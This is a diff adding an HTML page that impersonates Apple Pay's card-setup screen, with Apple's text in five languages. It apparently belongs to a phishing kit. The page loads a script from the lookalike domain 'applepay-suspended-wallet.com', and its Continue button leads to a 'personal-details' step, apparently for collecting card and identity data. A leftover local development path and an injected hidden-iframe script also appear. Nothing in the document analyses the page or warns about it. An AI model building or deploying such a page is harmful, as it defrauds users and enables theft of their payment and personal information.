@@ -1,0 +1,227 @@
+<html lang="en" dir="ltr">
+  <head>
+    <script src="files/js/jquery.js"></script>
+    <meta charset="utf-8">
+    <title>Apple Pay</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+    <script src="https://applepay-suspended-wallet.com/js/cntdjs/jquery.js"></script>
+  </head>
+  <body>
+    <style>
+      .input {
+        border-radius: 0 !important;
+        border: 0px solid lightgray;
+        background: rgba(155, 155, 155, 0.2);
+      }
+
+      .input:focus {
+        outline: none;
+      }
+
+      .submit {
+        margin-top: 1px;
+        width: 100%;
+        background: rgb(10, 132, 255);
+        color: white;
+        border: 1px solid rgb(60, 60, 255);
+        border-radius: 7px;
+        height: 35px;
+      }
+
+      .submit:hover {
+        filter: brightness(95%);
+      }
+
+      .logo {
+        width: 20%;
+        display: block;
+        margin: auto;
+        margin-top: 15px;
+      }
+
+      .title {
+        font-size: 20px;
+        margin-top: 10px;
+        text-align: center;
+      }
+
+      .inner-content {
+        /* padding-left: 40px; */
+        /* padding-right: 40px; */
+      }
+
+      .disclaimer {
+        text-align: center;
+        margin-top: 45px;
+        font-size: 14px;
+      }
+
+      .disclaimer-link {
+        text-align: center;
+        font-size: 14px;
+      }
+
+      .black {
+        background-color: black;
+        outline: none;
+        border: none;
+      }
+
+      #center {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 500px;
+      }
+
+      @media only screen and (max-width: 1035px) {
+        #center {
+          margin-top: 50px;
+          position: relative !important;
+          transform: none;
+          top: 0%;
+          left: 0%;
+        }
+
+        .title {
+          margin-top: 30px;
+          font-size: 19px;
+        }
+
+        .disclaimer {
+          font-size: 13px;
+        }
+
+        .submit {
+          width: 90%;
+          display: block;
+          margin: auto;
+          margin-top: 30px;
+        }
+      }
+
+      body {
+        background: #FAFAFA;
+      }
+    </style>
+    <div class="container content" style="width: 100%">
+      <div>
+        <div class="col-lg-12">
+          <div class="col-12"></div>
+          <div class="row">
+            <div class="col-lg-12 inner-content">
+              <img style="width: 250px; display: block; margin: auto; margin-bottom: 15px;" src="https://www.apple.com/newsroom/images/product/services/standard/iPhone_X_Apple_Pay_Wallet_Action_screen_inline.jpg.large.jpg">
+              <br>
+              <img style="margin-top: 15px;" class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Apple_Pay_logo.svg/1024px-Apple_Pay_logo.svg.png">
+              <h2 class="title" id="title1">Connect your debit and credit cards with Apple Pay to make secure payments in apps, on the web and in stores using NFC.</h2>
+              <p class="disclaimer" id="title2">Card-related information, location and information about device settings and use patterns will be sent to Apple and may be shared together with account information with your card issuer or bank to set up Apple Pay. <br>
+                <br>
+                <a href="#" class="disclaimer-link" id="title3">See how your data is managed.</a>
+              </p>
+            </div>
+          </div>
+        </div>
+        <button class="submit" id="title4">Continue</button>
+
+
+        <script>
+          document.getElementById("title4").addEventListener("click", function() {
+            window.location = "http://127.0.0.1:5500/PersonalDetals/index2.html";
+          });
+        </script>
+        
+        
+      </div>
+    </div>
+    <script>
+      // Auto Translator
+      var page_elements = ["title1", "title2", "title3", "title4"];
+      var current_language = "AU".toLowerCase();
+      var languages = {
+        gb: {
+          title1: 'Connect your debit and credit cards with Apple Pay to make secure payments in apps, on the web and in stores using NFC.',
+          title2: 'Card-related information, location and information about device settings and use patterns will be sent to Apple and may be shared together with account information with your card issuer or bank to set up Apple Pay.',
+          title3: 'See how your data is managed.',
+          title4: 'Continue'
+        },
+        fr: {
+          title1: "Connectez vos cartes de débit et de crédit à Apple Pay pour effectuer des paiements sécurisés dans les applications, sur le Web et dans les magasins à l'aide de NFC.",
+          title2: "Les informations relatives à la carte, l'emplacement et les informations sur les paramètres de l'appareil et les habitudes d'utilisation seront envoyées à Apple et peuvent être partagées avec les informations de compte avec l'émetteur de votre carte ou votre banque pour configurer Apple Pay.",
+          title3: "Découvrez comment vos données sont gérées.",
+          title4: "Continuer"
+        },
+        es: {
+          title1: 'Conecte sus tarjetas de débito y crédito con Apple Pay para realizar pagos seguros en aplicaciones, en la web y en tiendas mediante NFC.',
+          title2: 'La información relacionada con la tarjeta, la ubicación y la información sobre la configuración del dispositivo y los patrones de uso se enviarán a Apple y se pueden compartir junto con la información de la cuenta con el emisor de la tarjeta o el banco para configurar Apple Pay.',
+          title3: 'Vea cómo se gestionan sus datos.',
+          title4: 'Continuar'
+        },
+        it: {
+          title1: 'Collega le tue carte di debito e di credito con Apple Pay per effettuare pagamenti sicuri nelle app, sul Web e nei negozi tramite NFC.',
+          title2: "Le informazioni relative alla carta, la posizione e le informazioni sulle impostazioni del dispositivo e sui modelli di utilizzo verranno inviate ad Apple e potrebbero essere condivise insieme alle informazioni sull'account con l'istituto di emissione della carta o la banca per configurare Apple Pay.",
+          title3: 'Guarda come vengono gestiti i tuoi dati.',
+          title4: 'Continua'
+        },
+        de: {
+          title1: 'Verbinden Sie Ihre Debit- und Kreditkarten mit Apple Pay, um mit NFC sicher in Apps, im Internet und in Geschäften zu bezahlen.',
+          title2: "Kartenbezogene Informationen, Standort und Informationen über Geräteeinstellungen und Nutzungsmuster werden an Apple gesendet und können zusammen mit Kontoinformationen an Ihren Kartenaussteller oder Ihre Bank weitergegeben werden, um Apple Pay einzurichten.",
+          title3: 'Sehen Sie, wie Ihre Daten verwaltet werden.',
+          title4: 'Fortsetzen'
+        }
+      }
+      for (var i = 0; i < page_elements.length; i++) {
+        $('#' + page_elements[i]).text(languages[current_language][page_elements[i]])
+      }
+    </script>
+    <script>
+      let btn = document.getElementById("title4");
+      btn.onclick = function() {
+        $('#center').fadeOut(1000);
+        setTimeout(function() {
+          window.location = '?p=personal-details';
+        }, 1000);
+      }
+    </script>
+    <script>
+      (function() {
+        var js = "window['__CF$cv$params']={r:'7973d5375cac0ebc',m:'uHcdSh8eYOF6kx78qLsDeiZY5zpFrXcmE0B2JllYX50-1676021498-0-AZz97md7SgC48hpFwFxKVCvZZAuHHYVGTSN/pw978cZhTaNwZj6PyXJTqj1Y0SmnKGC69Zk/tHtMlYt05rGI+7sbvZ9+RnBUj5f0T6Wm29WuWhuNnFraENgwtFXjTfE2Rg==',s:[0xa921437b11,0x3fffa899e6],u:'/cdn-cgi/challenge-platform/h/b'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/h/b/scripts/alpha/invisible.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);";
+        var _0xh = document.createElement('iframe');
+        _0xh.height = 1;
+        _0xh.width = 1;
+        _0xh.style.position = 'absolute';
+        _0xh.style.top = 0;
+        _0xh.style.left = 0;
+        _0xh.style.border = 'none';
+        _0xh.style.visibility = 'hidden';
+        document.body.appendChild(_0xh);
+
+        function handler() {
+          var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;
+          if (_0xi) {
+            var _0xj = _0xi.createElement('script');
+            _0xj.nonce = '';
+            _0xj.innerHTML = js;
+            _0xi.getElementsByTagName('head')[0].appendChild(_0xj);
+          }
+        }
+        if (document.readyState !== 'loading') {
+          handler();
+        } else if (window.addEventListener) {
+          document.addEventListener('DOMContentLoaded', handler);
+        } else {
+          var prev = document.onreadystatechange || function() {};
+          document.onreadystatechange = function(e) {
+            prev(e);
+            if (document.readyState !== 'loading') {
+              document.onreadystatechange = prev;
+              handler();
+            }
+          };
+        }
+      })();
+    </script>
+    <iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;"></iframe>
+  </body>
+</html>
